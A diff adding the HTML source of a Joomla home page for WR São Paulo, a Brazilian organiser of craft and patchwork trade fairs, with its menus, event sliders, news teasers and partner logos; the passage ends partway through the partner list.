@@ -1,0 +1,707 @@
+<!--In�cio do C�digo -->
+<script language="javascript" type="text/javascript" src="moblee/moblee_detect.js" ></script>
+<!-- Fim do c�digo -->
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" 
+
+	  xmlns:og="http://ogp.me/ns#" 
+
+	  xmlns:fb="http://www.facebook.com/2008/fbml" 
+
+	  xml:lang="pt-br" lang="pt-br">
+
+<head>
+
+    
+
+    
+    
+
+    <meta http-equiv="X-UA-Compatible" content="IE=9" />
+
+
+
+      <base href="http://www.wrsaopaulo.com.br/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="keywords" content="mega artesanal, artesanato, ceiras e congressos, eventos, patchwork, scrapbooking, feira de belém" />
+  <meta name="description" content="A WR São Paulo é uma empresa especializada na realização de eventos dos setores de técnicas e produtos para arte e artesanato, meio ambiente e de base madeireiro florestal. " />
+  <meta name="generator" content="Joomla! - Open Source Content Management" />
+  <title>Feiras e Congressos | WR São Paulo</title>
+  <link href="/index.php?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+  <link href="/index.php?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+  <link href="http://www.wrsaopaulo.com.br/templates/gk_coffe/images/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+  <link href="/templates/gk_coffe/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+  <link rel="stylesheet" href="/media/system/css/modal.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/gk_coffe/css/k2.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/plugins/content/rokcomments/css/rokcomments.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/menu.gkmenu.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/reset/meyer.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/layout.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/joomla.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/template.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/menu.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/gk.stuff.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/typography.style1.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/typography.iconset.1.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/typography.iconset.2.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/typography.iconset.3.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/style1.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/modules/mod_news_pro_gk4/interface/css/style.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.wrsaopaulo.com.br/modules/mod_image_show_gk4/styles/gk_coffe/style.css" type="text/css" />
+  <link rel="stylesheet" href="/components/com_visualcalendar/TDE_VCalendar/public_component.css" type="text/css" />
+  <link rel="stylesheet" href="/components/com_visualcalendar/TDE_VCalendar/remark.css" type="text/css" />
+  <style type="text/css">
+.gkWrap { width: 1002px!important; }body,
+#gkMenu,
+h2,
+span.menu-title,
+#gkMenu .level0 > li li,
+#gkDropMain ul > li li,
+ul.gkTabs li span,
+.gkIsText,
+h3.header { font-family: Arial, Helvetica, sans-serif; }
+#bottomWrap h3,
+#mainPage .box h3,
+#mainPage .box_menu h3,
+#mainPage .box_text h3,
+
+ { font-family: Verdana, Geneva, sans-serif; }
+h1,
+
+h3,
+.componentheading, 
+.articleContent h4,
+#gkMenu .level0 > li,
+#gkDropMain ul > li { font-family: Times, "Times New Roman", serif; }
+#gkToptop1 { width: 100%; }#gkbottombottom2 { width: 46%; }#gkbottombottom3 { width: 8%; }#gkbottombottom4 { width: 46%; }#gkbottombottom7 { width: 100%; }#gkTab-80 .gkTabContainer0, #gkTab-80 .gkTabContainer1, #gkTab-80 .gkTabContainer2 { height: 275px; }
+  </style>
+  <script src="/media/system/js/mootools-core.js" type="text/javascript"></script>
+  <script src="/media/system/js/core.js" type="text/javascript"></script>
+  <script src="/media/system/js/mootools-more.js" type="text/javascript"></script>
+  <script src="/media/system/js/modal.js" type="text/javascript"></script>
+  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.6/jquery.min.js" type="text/javascript"></script>
+  <script src="/components/com_k2/js/k2.js" type="text/javascript"></script>
+  <script src="/media/system/js/caption.js" type="text/javascript"></script>
+  <script src="http://www.wrsaopaulo.com.br/templates/gk_coffe/js/menu.gkmenu.js" type="text/javascript"></script>
+  <script src="http://www.wrsaopaulo.com.br/templates/gk_coffe/js/gk.scripts.js" type="text/javascript"></script>
+  <script src="http://www.wrsaopaulo.com.br/modules/mod_news_pro_gk4/interface/scripts/engine.js" type="text/javascript"></script>
+  <script src="http://www.wrsaopaulo.com.br/modules/mod_tabs_gk4/scripts/engine.js" type="text/javascript"></script>
+  <script src="http://www.wrsaopaulo.com.br/modules/mod_image_show_gk4/styles/gk_coffe/engine.js" type="text/javascript"></script>
+  <script src="/components/com_visualcalendar/TDE_VCalendar/yahoo.js" type="text/javascript"></script>
+  <script src="/components/com_visualcalendar/TDE_VCalendar/event.js" type="text/javascript"></script>
+  <script src="/components/com_visualcalendar/TDE_VCalendar/dom.js" type="text/javascript"></script>
+  <script src="/components/com_visualcalendar/TDE_VCalendar/calendar.js" type="text/javascript"></script>
+  <script src="/components/com_visualcalendar/TDE_VCalendar/TDECalendar.js" type="text/javascript"></script>
+  <script src="/components/com_visualcalendar/TDE_VCalendar/dragdrop.js" type="text/javascript"></script>
+  <script src="/components/com_visualcalendar/TDE_VCalendar/animation.js" type="text/javascript"></script>
+  <script src="/components/com_visualcalendar/TDE_VCalendar/container.js" type="text/javascript"></script>
+  <script src="/components/com_visualcalendar/TDE_VCalendar/remark.js" type="text/javascript"></script>
+  <script type="text/javascript">
+
+		window.addEvent('domready', function() {
+
+			SqueezeBox.initialize({});
+			SqueezeBox.assign($$('a.modal'), {
+				parse: 'rel'
+			});
+		});var K2SitePath = '/';window.addEvent('load', function() {
+				new JCaption('img.caption');
+			}); $GKMenu = { height:true, width:true, duration: 250 };$GK_TMPL_URL = "http://www.wrsaopaulo.com.br/templates/gk_coffe";//<![CDATA[
+		try {$Gavick;}catch(e){$Gavick = {};};
+		$Gavick["gktab-gkTab-80"] = {
+			"activator" : "click",
+			"animation" : 0,
+			"animation_speed" : 250,
+			"animation_interval" : 5000,
+			"animation_type" : "slider",
+			"animation_function" : Fx.Transitions.linear,
+			"active_tab" : 1,
+			"cookie_save" : 0
+		};
+		//]]>try {$Gavick;}catch(e){$Gavick = {};};$Gavick["gkIs-gk-is-93"] = { "anim_speed": 350, "anim_interval": 5000, "autoanim": 1, "anim_type": "opacity", "slide_links": 1 };var pathCalendar = "/components/com_visualcalendar/TDE_VCalendar/";var pathCalendarJB = "/";
+  </script>
+
+
+    
+
+	<!--[if IE 9.0]><link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/ie9.css" type="text/css" /><![endif]-->
+	<!--[if IE 8.0]><link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/ie8.css" type="text/css" /><![endif]-->
+	<!--[if IE 7.0]><link rel="stylesheet" href="http://www.wrsaopaulo.com.br/templates/gk_coffe/css/ie7.css" type="text/css" /><![endif]-->
+	
+
+ 
+
+
+<style>
+
+body > .bg {
+
+background: white;
+
+padding-bottom: 1px;
+
+}
+
+</style>
+
+
+    
+
+</head>
+
+<body>
+
+
+
+	<div class="bg">
+
+		
+
+
+        
+
+		
+		
+
+		
+				
+
+		<div id="gkPageTop" class="gkMain gkWrap clear">    
+
+		    
+<span>---</span>
+               <h1 id="gkLogo">
+          <a href="/./" class="cssLogo"></a>
+     </h1>
+          <span>---</span>
+
+		</div>
+
+		
+
+		<div id="gkMainNav" class="gkWrap">
+	<div id="gkMenu">
+		<div class="gk-menu">
+<ul class="gkmenu level0"><li  class="first active"><a href="http://www.wrsaopaulo.com.br/"  class=" first active" id="menu101" title="Home"><span class="menu-title">Home</span></a></li><li  class="haschild"><a href="#"  class=" haschild" id="menu264" title="WR São Paulo"><span class="menu-title">WR São Paulo</span></a><div class="childcontent" style="width: 200px;">
+<div class="childcontent-inner" style="width: 200px;">
+<div class="gkcol  first" style="width: 200px;"><ul class="gkmenu level1"><li  class="first"><a href="/index.php/wr-sao-paulo/historia"  class=" first" id="menu270" title="História"><span class="menu-title">História</span></a></li><li ><a href="/index.php/wr-sao-paulo/o-que-fazemos"  id="menu271" title="O que fazemos"><span class="menu-title">O que fazemos</span></a></li><li ><a href="/index.php/wr-sao-paulo/parceiros"  id="menu273" title="Parceiros"><span class="menu-title">Parceiros</span></a></li><li  class="last"><a href="/index.php/wr-sao-paulo/responsabilidade-social"  class=" last" id="menu274" title="Responsabilidade Social"><span class="menu-title">Responsabilidade Social</span></a></li></ul></div>
+</div>
+</div></li><li  class="haschild"><a href="#"  class=" haschild" id="menu265" title="Eventos"><span class="menu-title">Eventos</span></a><div class="childcontent" style="width: 400px;">
+<div class="childcontent-inner" style="width: 400px;">
+<div class="gkcol  first" style="width: 200px;"><ul class="gkmenu level1"><li  class="first"><a href="/index.php/eventos/mega-artesanal"  class=" first" id="menu290" title="Mega Artesanal"><span class="menu-title">Mega Artesanal</span></a></li><li ><a href="/index.php/eventos/artesanal-porto-alegre"  id="menu293" title="Artesanal Porto Alegre"><span class="menu-title">Artesanal Porto Alegre</span></a></li><li ><a href="/index.php/eventos/patchwork-sao-paulo"  id="menu296" title="Brazil Patchwork Show"><span class="menu-title">Brazil Patchwork Show</span></a></li><li ><a href="/index.php/eventos/patch-arte-sp"  id="menu297" title="Patch &amp; Arte São Paulo"><span class="menu-title">Patch &amp; Arte São Paulo</span></a></li></ul></div><div class="gkcol  last" style="width: 200px;"><ul class="gkmenu level1"><li  class="first"><a href="/index.php/eventos/scrap-arte-brasilia"  class=" first" id="menu298" title="Scrap &amp; Patch Brasília"><span class="menu-title">Scrap &amp; Patch Brasília</span></a></li><li ><a href="/index.php/eventos/brasil-scrapbooking-show"  id="menu308" title="Brazil Scrapbooking Show"><span class="menu-title">Brazil Scrapbooking Show</span></a></li><li ><a href="/index.php/eventos/artesanal-confeitaria-e-festa"  id="menu448" title="Artesanal Confeitaria e Festa"><span class="menu-title">Artesanal Confeitaria e Festa</span></a></li><li ><a href="/index.php/eventos/feira-burda-expo"  id="menu477" title="Burda Expo"><span class="menu-title">Burda Expo</span></a></li></ul></div>
+</div>
+</div></li><li ><a href="/index.php/clientes"  id="menu266" title="Clientes"><span class="menu-title">Clientes</span></a></li><li ><a href="/index.php/noticias"  id="menu267" title="Notícias "><span class="menu-title">Notícias </span></a></li><li ><a href="/index.php/imprensa"  id="menu268" title="Imprensa"><span class="menu-title">Imprensa</span></a></li><li  class="last"><a href="/index.php/contato"  class=" last" id="menu269" title="Contato"><span class="menu-title">Contato</span></a></li></ul>
+</div>	
+			</div>
+    <div class="linguas" style="position: absolute; bottom: 8px; left: 91%;right: auto;top: auto;width: 87px;height: 23px;">
+<img src="/br.png" width="16" height="12" style="padding:0 5px" />
+<a href="/../espanol"><img src="/es.png" width="16" height="12" style="padding:0 5px"/></a>
+<a href="/../english"><img src="/en.png" width="16" height="12" style="padding:0 5px"/></a></div>
+</div>
+
+
+	    
+
+	    
+
+    </div>
+
+    <div id="destaque" >
+
+    <div id="mainPage-destaque" class="gkWrap">	
+
+<div id="gkHeader" class="gkMain">
+		<div id="gkHeaderModule1" style=width:41%>
+		<div class="box"><div><div class="content"><div class="moduletable">
+
+<input name="selDayVCm1" type="hidden" id="selDayVCm1" onChange="changeDate('VCm1')" />
+<input name="selMonthVCm1" type="hidden" id="selMonthVCm1" onChange="changeDate('VCm1')" />
+<input name="selYearVCm1" type="hidden" id="selYearVCm1" onChange="changeDate('VCm1')" />
+<div style="z-index:1000;">
+    <div id="containerVCm1" class="VCalendar vcmodule"></div>
+</div>
+<script type="text/javascript">initCalendar('VCm1','1','PT');</script>
+<div style="clear:both"></div>
+</div></div></div></div>
+	</div>
+		
+		<div id="gkHeaderModule2" style=width:56%>
+		<div class="box noborder shadow2"><div><div class="content">
+<div id="gkIs-gk-is-93" class="gkIsWrapper-gk_coffe">
+	<div class="gkIsPreloader"></div>
+	
+	<div class="gkIsImage" style="width: 511px;height: 265px;">
+										
+			<div class="gkIsSlide" style="z-index: 1;" title="Brazil Patchwork Show">http://www.wrsaopaulo.com.br/modules/mod_image_show_gk4/cache/Banners_Home_Principal.Brazil_Patchworkgk-is-93.jpg<a href="/">link</a></div>
+												
+			<div class="gkIsSlide" style="z-index: 2;" title="Brazil Scrapbook Show">http://www.wrsaopaulo.com.br/modules/mod_image_show_gk4/cache/Banners_Home_Principal.Brazil_Scrapbookinggk-is-93.jpg<a href="/index.php/eventos/brasil-scrapbooking-show">link</a></div>
+												
+			<div class="gkIsSlide" style="z-index: 3;" title="Scrap &amp; Patch Brasília">http://www.wrsaopaulo.com.br/modules/mod_image_show_gk4/cache/Banners_Home_Principal.Scrap-Patch_Brasiliagk-is-93.jpg<a href="/index.php/eventos/scrap-arte-brasilia">link</a></div>
+												
+			<div class="gkIsSlide" style="z-index: 4;" title="Mega Artesanal">http://www.wrsaopaulo.com.br/modules/mod_image_show_gk4/cache/Banners_Home_Principal.Mega_Artesanalgk-is-93.jpg<a href="/index.php/eventos/mega-artesanal">link</a></div>
+												
+			<div class="gkIsSlide" style="z-index: 5;" title="Artesanal Confeitaria &amp; Festa">http://www.wrsaopaulo.com.br/modules/mod_image_show_gk4/cache/Banners_Home_Principal.Artesanal_Confeitaria_Festagk-is-93.jpg<a href="/index.php/eventos/artesanal-confeitaria-e-festa">link</a></div>
+												
+			<div class="gkIsSlide" style="z-index: 6;" title="Patch &amp; Arte São Paulo">http://www.wrsaopaulo.com.br/modules/mod_image_show_gk4/cache/Banners_Home_Principal.Patch_Arte_SPgk-is-93.jpg<a href="/">link</a></div>
+												
+			<div class="gkIsSlide" style="z-index: 7;" title="Artesanal Porto Alegre">http://www.wrsaopaulo.com.br/modules/mod_image_show_gk4/cache/Banners_Home_Principal.Artesanal_Porto_Alegregk-is-93.jpg<a href="/index.php/eventos/artesanal-porto-alegre">link</a></div>
+																									</div>
+	
+		<div class="gkIsPrev"><span>&laquo;</span></div>
+	<div class="gkIsNext"><span>&raquo;</span></div>
+		
+		<div class="gkIsText">Loading&hellip;</div>
+	
+	<div class="gkIsTextData">
+						
+				
+		<div class="gkIsTextItem">
+							<a href="/">Brazil Patchwork Show</a>
+					</div>
+								
+				
+		<div class="gkIsTextItem">
+							<a href="/index.php/eventos/brasil-scrapbooking-show">Brazil Scrapbook Show</a>
+					</div>
+								
+				
+		<div class="gkIsTextItem">
+							<a href="/index.php/eventos/scrap-arte-brasilia">Scrap &amp; Patch Brasília</a>
+					</div>
+								
+				
+		<div class="gkIsTextItem">
+							<a href="/index.php/eventos/mega-artesanal">Mega Artesanal</a>
+					</div>
+								
+				
+		<div class="gkIsTextItem">
+							<a href="/index.php/eventos/artesanal-confeitaria-e-festa">Artesanal Confeitaria &amp; Festa</a>
+					</div>
+								
+				
+		<div class="gkIsTextItem">
+							<a href="/">Patch &amp; Arte São Paulo</a>
+					</div>
+								
+				
+		<div class="gkIsTextItem">
+							<a href="/index.php/eventos/artesanal-porto-alegre">Artesanal Porto Alegre</a>
+					</div>
+																									</div>
+	</div></div></div></div>
+	</div>
+	</div>
+
+</div>
+
+    </div>
+
+    <div id="mainPage" class="gkWrap">	
+
+	    	
+<div id="system-message-container">
+</div>
+	    
+
+	    	
+
+	    	
+
+	    	
+<div id="gkTop1" class="gkMain ">
+			
+	<div id="gkToptop1" class="gkCol gkColFull">
+				<div class="box clear dark"><div><div class="content">
+<div class="gkTab" id="gkTab-80">
+	<div class="gkTabWrap">
+	    	    <ul class="gkTabs top">
+	    		    		    	<li class="gkTab-1 active"><span>Próximos Eventos 01</span></li>
+	    		    		    	<li class="gkTab-2"><span>Próximos Eventos 02</span></li>
+	    		    </ul>
+	    	                
+		<div class="gkTabContainer0">
+	        <div class="gkTabContainer1">
+	            <div class="gkTabContainer2">
+	                
+<div class="gkTabItem active">
+	<div class="gkTabItemSpace">
+		<div class="nspMain autoanim nspFs100" id="nsp-nsp_87" style="width:100%;">
+					<div class="nspArts bottom" style="width:100%;">
+								
+														<div class="nspArt" style="width:25%;clear:both;"><div style="padding:0 0 0 0"><a href="/index.php/our-services/18-home-eventos-ver/249-brazil-patchwork"><img class="nspImage tleft fnone" src="/images/Proximos_Eventos/Patchwork_SP.png" alt="21 - Brazil Patchwork Show" style="width:215px;height:250px;margin:0 0 0 0;"  /></a><p class="nspText tleft fnone"> 
+window.location = 'http://www.wrsaopaulo.com.br/index.php/eventos/patchwork-sao-paulo';
+
+</p></div></div>
+														<div class="nspArt" style="width:25%;"><div style="padding:0 0 0 0"><a href="/index.php/our-services/18-home-eventos-ver/253-brazil-scrapbooking"><img class="nspImage tleft fnone" src="/images/Proximos_Eventos/Brazil_Scrapbooking.png" alt="22 - Brazil Scrapbooking Show" style="width:215px;height:250px;margin:0 0 0 0;"  /></a><p class="nspText tleft fnone"> 
+window.location = 'http://www.wrsaopaulo.com.br/index.php/eventos/brasil-scrapbooking-show';
+
+</p></div></div>
+														<div class="nspArt" style="width:25%;"><div style="padding:0 0 0 0"><a href="/index.php/our-services/18-home-eventos-ver/78-scrap-arte-brasilia"><img class="nspImage tleft fnone" src="/images/Proximos_Eventos/Scrap_Patch_Brasilia.png" alt="23 - Scrap &amp; Patch Brasília" style="width:215px;height:250px;margin:0 0 0 0;"  /></a><p class="nspText tleft fnone"> 
+window.location = 'http://www.wrsaopaulo.com.br/index.php/eventos/scrap-arte-brasilia';
+
+</p></div></div>
+														<div class="nspArt" style="width:25%;"><div style="padding:0 0 0 0"><a href="/index.php/our-services/18-home-eventos-ver/271-07-mega-artesanal"><img class="nspImage tleft fnone" src="/images/Proximos_Eventos/Mega_Artesanal.png" alt="24 - Mega Artesanal" style="width:215px;height:250px;margin:0 0 0 0;"  /></a><p class="nspText tleft fnone"> 
+window.location = 'http://www.wrsaopaulo.com.br/index.php/eventos/mega-artesanal';
+
+</p></div></div>
+					
+			</div>
+					</div>
+
+<script type="text/javascript">
+//<![CDATA[
+try {$Gavick;}catch(e){$Gavick = {};};
+$Gavick["nsp-nsp_87"] = {
+	"animation_speed": 400,
+	"animation_interval": 5000,
+	"animation_function": Fx.Transitions.Expo.easeIn,
+	"news_column": 4,
+	"news_rows": 1,
+	"links_columns_amount": 1,
+	"links_amount": 3,
+	"counter_text": '<strong>Page:</strong>'
+};
+//]]>
+</script>		</div>
+</div>
+<div class="gkTabItem">
+	<div class="gkTabItemSpace">
+		<div class="nspMain nspFs100" id="nsp-nsp_88" style="width:100%;">
+					<div class="nspArts bottom" style="width:100%;">
+								
+														<div class="nspArt" style="width:25%;clear:both;"><div style="padding:0 7px 0 0"><a href="/index.php/our-services/18-home-eventos-ver/351-09-artesanal-confeitaria-festa"><img class="nspImage tleft fnone" src="/images/Proximos_Eventos/Artesanal_Confeitaria_Festa.png" alt="25 - Artesanal Confeitaria &amp; Festa" style="width:215px;height:250px;margin:0 0 0 0;"  /></a></div></div>
+														<div class="nspArt" style="width:25%;"><div style="padding:0 7px 0 0"><a href="/index.php/our-services/18-home-eventos-ver/241-patch-arte-sao-paulo"><img class="nspImage tleft fnone" src="/images/Proximos_Eventos/Patch_Arte_SP.png" alt="27 - Patch &amp; Arte São Paulo" style="width:215px;height:250px;margin:0 0 0 0;"  /></a></div></div>
+														<div class="nspArt" style="width:25%;"><div style="padding:0 7px 0 0"><a href="/index.php/our-services/18-home-eventos-ver/90-artesanal-porto-alegre"><img class="nspImage tleft fnone" src="/images/Proximos_Eventos/Artesanal-Porto-Alegre.png" alt="28 - Artesanal Porto Alegre" style="width:215px;height:250px;margin:0 0 0 0;"  /></a></div></div>
+					
+			</div>
+					</div>
+
+<script type="text/javascript">
+//<![CDATA[
+try {$Gavick;}catch(e){$Gavick = {};};
+$Gavick["nsp-nsp_88"] = {
+	"animation_speed": 400,
+	"animation_interval": 5000,
+	"animation_function": Fx.Transitions.Expo.easeIn,
+	"news_column": 4,
+	"news_rows": 1,
+	"links_columns_amount": 1,
+	"links_amount": 3,
+	"counter_text": '<strong>Page:</strong>'
+};
+//]]>
+</script>		</div>
+</div>	            </div>
+	        </div>
+	    </div>
+		
+			</div>
+		
+		<div class="gkTabButtonNext">next</div>
+	<div class="gkTabButtonPrev">prev</div>
+	</div></div></div></div>
+	</div>
+		</div>
+
+
+	    	
+
+	    	
+<div id="gkMain" style="margin-bottom: 20px;">
+	<div id="gkMainBlock" class="gkMain">
+		
+
+	
+				<div id="gkContent" class="gkMain gkCol gkPaddingTBLR" style=width:>
+						
+						<div id="gkContentMainbody" class="gkMain gkPaddingTBLR">
+							
+				
+														
+				<div id="gkComponentWrap" class="gkMain  " style=width:>	
+						
+					
+										
+										<div class="box-not-para-home"><div><div class="content">
+
+<div class="custom-not-para-home"  >
+	<p style="padding:0; margin:-20px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</p></div>
+</div></div></div>
+										
+										
+										
+									</div>
+									
+					
+			</div>
+						
+					</div>
+			
+		
+
+	</div>
+</div>
+
+     </div>
+
+     <hr/>
+
+     <div id="mainPage" class="gkWrap">
+
+            
+
+            
+<div id="gkMain">
+	<div id="gkMainBlock" class="gkMain">
+		
+
+	
+				<div id="gkContent" class="gkMain gkCol gkPaddingTBLR" style=width:53%>
+						
+						<div id="gkContentMainbody" class="gkMain gkPaddingTBLR">
+							
+				
+														
+				<div id="gkComponentWrap" class="gkMain gkCol " style=width:85%>	
+						
+					
+										
+					
+										<div class="box-titulo-wr"><div><div class="content">
+
+<div class="custom-titulo-wr"  >
+	<p style="line-height: 1px; padding-top: 13px; font-size: 14px; font-family: Arial; color: black;padding-left: 8px;
+margin-bottom: 6px;">WR São Paulo</p></div>
+</div></div></div><div class="box nsp"><div><h3 class="header">Notícias </h3><div class="content">	<div class="nspMain nspFs100" id="nsp-nsp_118" style="width:100%;">
+					<div class="nspArts bottom" style="width:100%;">
+								<div class="nspTopInterface">
+					<div>
+												<ul class="nspPagination">
+														<li>1</li>
+														<li>2</li>
+													</ul>
+												
+												<span class="nspPrev">Prev</span>
+						<span class="nspNext">Next</span>
+												
+											</div>
+				</div>
+								
+														<div class="nspArt" style="width:100%;"><div style="padding:0 0 20px 0"><h4 class="nspHeader tleft fnone"><a href="/index.php/noticias/81-noticias01" title="Agenda lotada!">Agenda lotada!</a></h4><p class="nspText tleft fleft">O mercado de feiras e eventos de negócios movimenta mais de R$ 20 bilhões ao ano, no Brasil. Somente a Região Metropolitana de São Paulo, que concentra 75% do setor, é responsável por fazer girar cerc...</p></div></div>
+														<div class="nspArt" style="width:100%;"><div style="padding:0 0 20px 0"><h4 class="nspHeader tleft fnone"><a href="/index.php/noticias/82-a-favor-do-meio-ambiente" title="A Favor do Meio Ambiente">A Favor do Meio Ambiente</a></h4><p class="nspText tleft fleft">Empresa atua no ramo de organização de feiras e eventos reunindo empresários preocupados com o meio ambiente
+</p></div></div>
+														<div class="nspArt unvisible" style="width:100%;"><div style="padding:0 0 20px 0"><h4 class="nspHeader tleft fnone"><a href="/index.php/noticias/80-faca-voce-mesmo" title="Faça você mesmo">Faça você mesmo</a></h4><p class="nspText tleft fleft">As estratégias de empreendedores que estão ganhando dinheiro com artesanato, matérias-primas e acessórios para trabalhos manuais – um mercado que movimento mais de 50 bilhões de reais por ano no Brasi...</p></div></div>
+					
+			</div>
+					</div>
+
+<script type="text/javascript">
+//<![CDATA[
+try {$Gavick;}catch(e){$Gavick = {};};
+$Gavick["nsp-nsp_118"] = {
+	"animation_speed": 400,
+	"animation_interval": 5000,
+	"animation_function": Fx.Transitions.Expo.easeIn,
+	"news_column": 1,
+	"news_rows": 2,
+	"links_columns_amount": 0,
+	"links_amount": 0,
+	"counter_text": '<strong>Page:</strong>'
+};
+//]]>
+</script>	</div></div></div><div class="box clear"><div><div class="content">
+
+<div class="custom clear"  >
+	<p><a href="mailto:wrsp@wrsaopaulo.com.br"><img src="/images/stories/demo/reservations_style1.png" border="0" alt="" style="margin-top: 0px;" /></a></p></div>
+</div></div></div>
+										
+									</div>
+									
+								<div id="gkinset4" class="gkMain gkCol " style=width:15%>
+					<div class="box clear"><div><div class="content">
+
+<div class="custom clear"  >
+	<p style="padding-top: 25px; float: right;"><a href="https://www.facebook.com/wr.s.paulo" target="_blank"> <img src="/images/face.png" alt="face" height="35" width="35" /></a><br /> <a target="_blank" href="http://www.linkedin.com/company/wr-são-paulo?trk=company_name"> <img src="/images/linkedin.png" alt="linkedin" height="35" width="35" /></a><br /> <a href="http://instagram.com/wrsaopaulo" target="_blank"> <img src="/images/Instagram.png" alt="Instagram" height="35" width="35" /></a></p></div>
+</div></div></div>
+				</div>
+					
+			</div>
+						
+					</div>
+			
+		
+
+	</div>
+</div>
+
+	    	
+
+	    	
+
+
+	    </div>
+
+    
+
+    <div id="bottomWrap">
+
+    	<div>
+
+    		
+<div id="gkBottom1" class="gkMain gkWrap ">
+			
+	<div id="gkbottombottom2" class="gkCol gkColLeft">
+				<div class="box-titulo-wr"><div><div class="content">
+
+<div class="custom-titulo-wr"  >
+	<p style="line-height: 1px; padding-top: 13px; font-size: 14px; font-family: Arial; color: black; padding-left: 0px; margin-bottom: 0px;">WR São Paulo</p></div>
+</div></div></div><div class="box"><div><h3 class="header">Uma empresa consciente</h3><div class="content">
+
+<div class="custom"  >
+	<p style="font-size: 11px; color: #000000; line-height: 0px; margin: 0; padding: 0;"><span style="font-size: 11px; color: #000000; line-height: 0px; margin: 0; padding: 0;"><strong><img src="/images/wr-consciente.png" alt="wr-consciente" height="64" width="126" /></strong></span></p>
+<p><span style="font-size: 11px; color: #000000; line-height: 12px;"><strong>Sustentabilidade e Responsabilidade Social.</strong></span></p>
+<p><span style="font-size: 11px; color: #000000; line-height: 12px;">Através do WR Consciente realizamos dois tipos de ações:<br /></span></p>
+<p><span style="font-size: 11px; color: #000000; line-height: 12px;">A primeira no âmbito da sustentabilidade, disseminando o conceito e atuando contra o desperdício de água, energia e de materiais, promovendo a coleta seletiva e a reciclagem de lixo dos eventos que produzimos.</span></p>
+<p><span style="font-size: 11px; color: #000000; line-height: 12px;">A segunda frente de atuação é a responsabilidade social, marcada pelo apoio ao desenvolvimento de projetos e cessão de espaços dentro dos eventos realizados de forma a inserir comunidades nos mercados que atuamos.</span></p></div>
+</div></div></div>
+	</div>
+				
+	<div id="gkbottombottom3" class="gkCol gkColCenter">
+				<div class="box"><div><div class="content">
+
+<div class="custom"  >
+	<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</p></div>
+</div></div></div>
+	</div>
+				
+	<div id="gkbottombottom4" class="gkCol gkColRight">
+				<div class="box-titulo-wr"><div><div class="content">
+
+<div class="custom-titulo-wr"  >
+	<p style="line-height: 1px; padding-top: 13px; font-size: 14px; font-family: Arial; color: black; margin-bottom: 0px; padding-left: 45px;">WR São Paulo</p></div>
+</div></div></div><div class="box nsp bottom4"><div><h3 class="header">Parceiros</h3><div class="content">	<div class="nspMain nspFs100" id="nsp-nsp_113" style="width:100%;">
+					<div class="nspArts bottom" style="width:100%;">
+								<div class="nspTopInterface">
+					<div>
+												
+												<span class="nspPrev">Prev</span>
+						<span class="nspNext">Next</span>
+												
+											</div>
+				</div>
+								
+														<div class="nspArt" style="width:100%;"><div style="padding:0 20px 0px 0"><div class="center tcenter fnone"><img class="nspImage" src="http://www.wrsaopaulo.com.br/modules/mod_news_pro_gk4/cache/Parceiros.fiepansp_113.png" alt="Fiepa" width:298px;height:70px;margin:3px 20px 0 0; /></div></div></div>
+														<div class="nspArt" style="width:100%;"><div style="padding:0 20px 0px 0"><div class="center tcenter fnone"><img class="nspImage" src="http://www.wrsaopaulo.com.br/modules/mod_news_pro_gk4/cache/Parceiros.abimcinsp_113.png" alt="Abimci" width:298px;height:70px;margin:3px 20px 0 0; /></div></div></div>
+														<div class="nspArt" style="width:100%;"><div style="padding:0 20px 0px 0"><div class="center tcenter fnone"><img class="nspImage" src="http://www.wrsaopaulo.com.br/modules/mod_news_pro_gk4/cache/Parceiros.sutaconsp_113.png" alt="Sutaco" width:298px;height:70px;margin:3px 20px 0 0; /></div></div></div>
+														<div class="nspArt unvisible" style="width:100%;"><div style="padding:0 20px 0px 0"><div class="center tcenter fnone"><img class="nspImage" src="http://www.wrsaopaulo.com.br/modules/mod_news_pro_gk4/cache/Parceiros.visite_spnsp_113.png" alt="São Paulo" width:298px;height:70px;margin:3px 20px 0 0; /></div></div></div>
+														<div class="nspArt unvisible" style="width:100%;"><div style="padding:0 20px 0px 0"><div class="center tcenter fnone"><img class="nspImage" src="http://www.wrsaopaulo.com.br/modules/mod_news_pro_gk4/cache/Parceiros.imafloransp_113.png" alt="Imaflora" width:298px;height:70px;margin:3px 20px 0 0; /></div></div></div>
